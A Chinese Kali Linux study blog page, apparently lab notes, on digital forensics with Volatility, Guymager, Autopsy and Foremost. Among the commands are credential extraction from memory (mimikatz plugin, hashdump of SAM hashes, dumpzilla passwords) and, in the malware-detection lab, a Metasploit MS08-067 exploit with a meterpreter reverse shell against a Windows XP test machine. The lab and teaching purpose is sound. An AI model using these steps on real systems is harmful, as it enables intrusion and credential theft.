<li>从Github上下载mimikatz插件到volatility的plugins库中</li>
<li><strong><code>🔺命令：volatility -f xp.raw imageinfo</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile==WindowXPSP3x86 mimikatz</code></strong></li>
<li>查看是否拿到密码</li>
</ul>
</li>
</ul>
<h4 id="6-实验–Firefox浏览器审计工具"><a href="#6-实验–Firefox浏览器审计工具" class="headerlink" title="6. 实验–Firefox浏览器审计工具"></a>6. 实验–Firefox浏览器审计工具</h4><ul>
<li>▲ 在未关机的情况下取证，找寻firefox使用的浏览信息</li>
<li>Kali<ul>
<li><strong><code>🔺命令：dumpzilla /root/.mozilla/firefox/bvpenhsu.default/ --Passwords</code></strong>（目录可能不一样）</li>
<li>查看是否可看到浏览器信息</li>
</ul>
</li>
<li>▲ 2020.03.04 –All参数被去除</li>
</ul>
<h4 id="7-死取证"><a href="#7-死取证" class="headerlink" title="7. 死取证"></a>7. 死取证</h4><ul>
<li>硬盘镜像<ul>
<li>使用Kali光盘启动计算机创建硬盘镜像文件（位镜像的拷贝）</li>
<li>留足存储镜像文件的存储空间</li>
<li>Dc3dd（来自美国空军计算机犯罪中心）</li>
<li>Dcfldd</li>
<li>Guymager</li>
<li>计算机取证技术参考数据集<ul>
<li><a href="http://www.cfreds.nist.gov/Controlv1_0/control.dd" target="_blank" rel="noopener">http://www.cfreds.nist.gov/Controlv1_0/control.dd</a></li>
</ul>
</li>
<li>DFF（Digital Forensics Framework）<ul>
<li>Open Evidence  #红色表示已经删除的文件</li>
<li>▲ Kali官方已经剔除DFF软件，也无法手动安装，只能去官网手动安装包下载</li>
</ul>
</li>
<li>Autopsy<ul>
<li>非常流行的硬盘镜像分析工具</li>
<li>WebServer+客户端架构</li>
</ul>
</li>
<li>Extundelete<ul>
<li>适用于ext3、ext4文件系统的反删除工具</li>
<li><strong><code>🔺命令：Extundelete [device-file] --restore-file [restore location]</code></strong> </li>
</ul>
</li>
<li>iPhone Backup Analyzer<ul>
<li>分析iTunes生成的iPhone手机备份文件，并非电话image</li>
</ul>
</li>
<li>Foremost（美国开发）<ul>
<li>从内存dump中恢复文档图片，支持raw、dd、iso、vmem、excel、doc等格式（图片非图像）</li>
<li><strong><code>🔺命令：foremost -t jpeg,gif,png,doc -i 7.raw</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="8-实验–Guymager"><a href="#8-实验–Guymager" class="headerlink" title="8. 实验–Guymager"></a>8. 实验–Guymager</h4><ul>
<li>Window 7光盘挂载Kali Linux，forensic mode启动（取证模式）</li>
<li>启动Guymager（可能无发现硬盘，可以进行选择扫描尝试）</li>
<li>选择要取证的硬盘 → 右键 → Acquire images<ul>
<li>Linux dd raw image/Expert Withess Format,sub-format Guymager</li>
<li>▲ 可以分成多个文件，并设置MD5/SHA-1/SHA-256的哈希验证</li>
<li>Case Number 999（钥匙数字）</li>
<li>Evidence Number 001（证据编号）</li>
<li>Examiner mzt（证据人）</li>
<li>Description server（描述）</li>
<li>Image directory（保存路径）</li>
<li>image filename（文件名）</li>
<li>info filename（信息文件名）</li>
</ul>
</li>
<li>Start</li>
</ul>
<p><img src="/images/kali/kali-notepad/kodex/index.php?user/publicLink&fid=b530q0aJH5AM4mNQlrn-PR6sLYorGWiNy4-8AagL83_hKfdBeuyz-PbjcwbuRBCyTynYga6NWvnuXNew1n1lV8Y70cVCSlNJrhXlohJUe_HlBIqbMH2Jr0VUmDFNEk0&file_name=/Guymager%E5%8F%96%E8%AF%81.png" alt="Guymager取证"></p>
<h4 id="9-实验–Autopsy"><a href="#9-实验–Autopsy" class="headerlink" title="9. 实验–Autopsy"></a>9. 实验–Autopsy</h4><ul>
<li>Kali<ul>
<li>▲ 2020.03.04 无法拷贝到control.dd文件，输入网址出现乱码</li>
<li>拷贝准备好的control.dd文件到/root目录下</li>
<li>autopsy启动服务端</li>
<li>浏览器访问：<a href="http://localhost:9999/autopsy" target="_blank" rel="noopener">http://localhost:9999/autopsy</a></li>
<li>NEW CASE → 添加信息（Case Name、Description、Investigator）→ NEW CASE</li>
<li>ADD HOST → 填写主机信息</li>
<li>ADD IMAGE → 镜像文件信息（Location、Type(分区还是整盘)、Import Method(一般为copy，move怕断电，Symlink怕移动链接失效)）</li>
<li>Next → Data Integrity（镜像文件的MD5的计算）→ File System Details → ADD</li>
<li>OK</li>
<li>ANALYZE（一般位FILE ANALYSNS）→ 可对文件进行一定的还原</li>
</ul>
</li>
</ul>
<h4 id="10-实验–Foremost"><a href="#10-实验–Foremost" class="headerlink" title="10. 实验–Foremost"></a>10. 实验–Foremost</h4><ul>
<li>Kali<ul>
<li>▲ 2020.03.04 因为Win7 暂时无法拷贝文件出来，所以将实验机器换为Window XP SP3</li>
<li>从共享文件夹拷贝window XP SP3的内存映像xp.raw到Kali上</li>
<li><strong><code>🔺命令：foremost -t jpeg,gif,png,doc -i xp.raw</code></strong></li>
<li>output文件夹中查看提取的文件</li>
</ul>
</li>
</ul>
<h4 id="11-网络取证"><a href="#11-网络取证" class="headerlink" title="11. 网络取证"></a>11. 网络取证</h4><ul>
<li>▲ 网络取证请看&lt;&lt;协议分析&gt;&gt;<ul>
<li>全流量镜像可以还原历史</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7--Volatility/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="Tomas">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/photo.jpg">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Tomas'Blog">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2020/03/04/Kali%20Linux%E7%AC%94%E8%AE%B0(%E4%B8%80%E7%99%BE%E4%B8%80%E5%8D%81%E5%85%AD)%EF%BC%9A%E5%8F%96%E8%AF%81%E5%B7%A5%E5%85%B7--Volatility/" itemprop="url">Kali Linux笔记(一百一十六)：取证工具--Volatility</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-04T19:00:16+08:00">
                2020-03-04
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Kali/" itemprop="url" rel="index">
                    <span itemprop="name">Kali</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          
            <div class="post-wordcount">
              
                
                <span class="post-meta-item-icon">
                  <i class="fa fa-file-word-o"></i>
                </span>
                
                  <span class="post-meta-item-text">字数统计&#58;</span>
                
                <span title="字数统计">
                  1.3k 字
                </span>
              

              
                <span class="post-meta-divider">|</span>
              

              
                <span class="post-meta-item-icon">
                  <i class="fa fa-clock-o"></i>
                </span>
                
                  <span class="post-meta-item-text">阅读时长 &asymp;</span>
                
                <span title="阅读时长">
                  5 分钟
                </span>
              
            </div>
          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <hr>
<h4 id="1-取证工具"><a href="#1-取证工具" class="headerlink" title="1. 取证工具"></a>1. 取证工具</h4><ul>
<li>▲ 分析内存需要扎实的计算机系统功底</li>
<li>分析内存<ul>
<li><strong><code>🔺命令：volatility imageinfo -f xp.raw</code></strong>  #文件信息，关注profile</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86</code></strong>  #数据库文件</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hivedump -o 0xe124f8a8</code></strong>  #按虚内存地址查看注册表内容</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</code></strong>  #用户账号<ul>
<li>注册表中Administrator对于SAM文件只有特殊的权限，无完全控制权限，可通过修改权限设置，添加父类子类继承选项赋予Administrator对SAM文件、其子文件以及其文件键值的完全控制权</li>
</ul>
</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 printkey -K &quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</code></strong>  #最后登陆的账号</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 userassist</code></strong>  #正在运行的程序、运行过多少次、最后一次运行时间等</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 pslist</code></strong>  #内存进程信息<ul>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 memdump -p 1456 -D test</code></strong>  #dump进程内存</li>
</ul>
</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hivelist</code></strong>  #注册表的蜂巢文件（SOFTWARE–操作系统+自安装软件信息）</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 pstree</code></strong>  #内存进程树信息</li>
<li><strong><code>🔺命令：volatility cmdscan -f xp.raw --profile=WinXPSP3X86</code></strong>  #命令行历史（类似history）</li>
<li><strong><code>🔺命令：volatility netscan -f xp.raw --profile=WinXPSP3X86</code></strong>  #所有网络连接<ul>
<li>该命令对x86架构的机器不起作用</li>
</ul>
</li>
<li><strong><code>🔺命令：volatility connscan -f xp.raw --profile=WinXPSP3X86</code></strong>  #所有建立的网络连接</li>
<li><strong><code>🔺命令：volatility iehistory -f xp.raw --profile=WinXPSP3X86</code></strong>  #建立的IE连接</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hashdump -y system虚地址 -s SAM虚地址</code></strong>  #提取哈希值</li>
</ul>
</li>
</ul>
<h4 id="2-实验"><a href="#2-实验" class="headerlink" title="2. 实验"></a>2. 实验</h4><ul>
<li>▲ 2020.03.04 因为Win7 暂时无法拷贝文件出来，所以将实验机器换为Window XP SP3</li>
<li>插件目录：/usr/lib/python2.7/dis-packages/volatility/plugins</li>
<li>拷贝Dump内存文件xp.raw到Kali的机子上</li>
<li>Volatility <ul>
<li>-h：帮助功能列表</li>
<li>-F：要分析文件</li>
<li>–profile：操作系统类型</li>
<li>-p：进程PID</li>
<li>-D：dump内存到的目录</li>
<li>-o：虚内存地址</li>
<li>-k：注册表的键值</li>
<li>-y：使用SYSTEM的虚地址</li>
<li>-s：使用SAM的虚地址</li>
</ul>
</li>
<li><strong><code>🔺命令：volatility imageinfo -f xp.raw</code></strong> </li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 pslist</code></strong><ul>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 memdump -p 1456 -D test</code></strong><ul>
<li>十六进制查看：<strong><code>🔺命令：hexeditor 1456.dump</code></strong></li>
<li>关键字符串：<strong><code>🔺命令：strings 1456.dump | grep password</code></strong></li>
</ul>
</li>
</ul>
</li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 pstree</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hivelist</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hivedump -o 0xe124f8a8</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 printkey -K &quot;SAM\Domains\Account\Users\Names&quot;</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 printkey -K &quot;SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&quot;</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 userassist</code></strong></li>
<li><strong><code>🔺命令：volatility cmdscan -f xp.raw --profile=WinXPSP3X86</code></strong></li>
<li><strong><code>🔺命令：volatility netscan -f xp.raw --profile=WinXPSP3X86</code></strong></li>
<li><strong><code>🔺命令：volatility connscan -f xp.raw --profile=WinXPSP3X86</code></strong></li>
<li><strong><code>🔺命令：volatility iehistory -f xp.raw --profile=WinXPSP3X86</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 hashdump -y system虚地址 -s SAM虚地址</code></strong></li>
</ul>
<h4 id="3-Volatility插件"><a href="#3-Volatility插件" class="headerlink" title="3. Volatility插件"></a>3. Volatility插件</h4><ul>
<li>Firefoxhistory插件（Python脚本文件）<ul>
<li>▲ 2020.03.04 因Window XP SP3中没有Firefox，此模块未实验</li>
<li><a href="http://downloads.volatilityfoundation.org/contest/2014/DaveLasalle_ForensicSuite.zip" target="_blank" rel="noopener">http://downloads.volatilityfoundation.org/contest/2014/DaveLasalle_ForensicSuite.zip</a> </li>
<li>插件地址：/usr/lib/python2.7/dist-packages/volatility/plugins/ </li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 firefoxhistory</code></strong> </li>
</ul>
</li>
<li>USN日志记录插件<ul>
<li>NTFS特性，用于跟踪硬盘内容变化（不具体记录变更内容）</li>
<li><a href="https://raw.githubusercontent.com/tomspencer/volatility/master/usnparser/usnparser.py" target="_blank" rel="noopener">https://raw.githubusercontent.com/tomspencer/volatility/master/usnparser/usnparser.py</a> </li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 usnparser --output=csv --output-file=usn.csv</code></strong><ul>
<li>▲ 2020.03.04 能输出文件，但文件没有任何信息</li>
</ul>
</li>
</ul>
</li>
<li>Timeline插件<ul>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3X86 timeliner</code></strong></li>
<li>从多个位置收集大量系统活动信息，绘画时间线、分析</li>
</ul>
</li>
</ul>
<h4 id="4-内存取证发现恶意软件"><a href="#4-内存取证发现恶意软件" class="headerlink" title="4. 内存取证发现恶意软件"></a>4. 内存取证发现恶意软件</h4><ul>
<li>恶意程序分析包网站集合<ul>
<li><a href="https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples" target="_blank" rel="noopener">https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples</a></li>
<li><a href="https://code.google.com/archive/p/volatility/wikis/SampleMemoryImages.wiki" target="_blank" rel="noopener">https://code.google.com/archive/p/volatility/wikis/SampleMemoryImages.wiki</a></li>
<li>▲ 2020.03.04 上列程序包，已经多年未更新</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址，关闭防火墙</li>
</ul>
</li>
<li>Kali<ul>
<li>网卡模式为Bridge模式，检查网络，<strong><code>🔺命令：ifconfig</code></strong>查看IP地址</li>
<li><strong><code>🔺命令：msfconsole -q</code></strong><ul>
<li><strong><code>🔺命令：use exploit/windows/smb/ms08_067_netapi</code></strong><ul>
<li><strong><code>🔺命令：set RHOST Window XP SP3的IP</code></strong></li>
<li><strong><code>🔺命令：set target 34</code></strong></li>
<li><strong><code>🔺命令：set payload windows/meterpreter/reverse_tcp</code></strong><ul>
<li><strong><code>🔺命令：set LHOST Kali的IP</code></strong></li>
<li><strong><code>🔺命令：exploit</code></strong></li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>查看是否拿到shell</li>
</ul>
</li>
<li>Window XP SP3<ul>
<li>启动Dumpit，保存文件为xp.raw</li>
</ul>
</li>
<li>Kali<ul>
<li>拷贝xp.raw到Kali上</li>
<li><strong><code>🔺命令：volatility imageinfo -f xp.raw</code></strong></li>
<li><strong><code>🔺命令：volatility -f xp.raw --profile=WinXPSP3x86 pstree</code></strong> #查看进程树</li>
<li><strong><code>🔺命令：volatility connscan</code></strong>  #查看网络连接，查看可疑进程的PID</li>
<li><strong><code>🔺命令：volatility getsids -p 可疑进程的PID（可多个）</code></strong>  #查看进程的SID<ul>
<li>正常的情况下，svchost的权限无SYSTEM权限，权限数量一般一样</li>
</ul>
</li>
<li><strong><code>🔺命令：volatility dlllist -p 111,222</code></strong>  #查看调动库文件</li>
<li><strong><code>🔺命令：volatility malfind -p 111,222 -D test</code></strong>  #检查结果查毒<ul>
<li>病毒文件标志<ul>
<li>标志：PAGE_EXECUTE_READWRITE</li>
<li>可执行文件：PE程序 -&gt; 在十六进制中为MZ开头</li>
<li>内存地址：内存地址多块，存在多个内存地址空间</li>
<li>查看文件类型：可执行程序还是数据（查看文件类型：file *）</li>
</ul>
</li>
<li>杀毒软件查杀<ul>
<li>拷贝单个文件到有杀毒软件的系统，查看是否被查杀</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>▲ 恶意程序<ul>
<li>体积小：基本上调系统的动态链接库，使自己的体积小，但兼容性差，到别的操作系统可能无法执行</li>
<li>体积大：基本上调自己的动态链接库，体积大，但兼容性好，可到别的操作系统执行</li>
</ul>
</li>
</ul>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/3/">Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><span class="page-number current">4</span><a class="page-number" href="/page/5/">5</a><span class="space">&hellip;</span><a class="page-number" href="/page/18/">18</a><a class="extend next" rel="next" href="/page/5/">Next</a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <img class="site-author-image" itemprop="image"
                src="/images/photo.jpg"
                alt="Tomas" />
            
              <p class="site-author-name" itemprop="name">Tomas</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">172</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                <a href="/categories/index.html">
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">分类</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                <a href="/tags/index.html">
                  <span class="site-state-item-count">10</span>
                  <span class="site-state-item-name">标签</span>
                </a>
              </div>
            

          </nav>

          

          
            <div class="links-of-author motion-element">
                
                  <span class="links-of-author-item">
                    <a href="https://github.com/Tomassky" target="_blank" title="GitHub">
                      
                        <i class="fa fa-fw fa-github"></i>GitHub</a>
                  </span>
                
                  <span class="links-of-author-item">
                    <a href="mailto:tomassky7@gmail.com" target="_blank" title="Gmail邮箱">
                      
                        <i class="fa fa-fw fa-envelope"></i>Gmail邮箱</a>
                  </span>
                
            </div>
          

          
          

          
          
            <div class="links-of-blogroll motion-element links-of-blogroll-block">
              <div class="links-of-blogroll-title">
                <i class="fa  fa-fw fa-link"></i>
                Links
              </div>
              <ul class="links-of-blogroll-list">
                
                  <li class="links-of-blogroll-item">
                    <a href="https://ylsword-cheat.top" title="LengSword" target="_blank">LengSword</a>
                  </li>
                
                  <li class="links-of-blogroll-item">
                    <a href="https://neigeshoufu.github.io/ljy.github.io" title="neigeshoufu" target="_blank">neigeshoufu</a>
                  </li>
                
              </ul>
            </div>
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">Tomas</span>

  
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-area-chart"></i>
    </span>
    
      <span class="post-meta-item-text">Site words total count&#58;</span>
    
    <span title="Site words total count">171.9k</span>
  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Mist</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  


  











  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  

  
  
    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
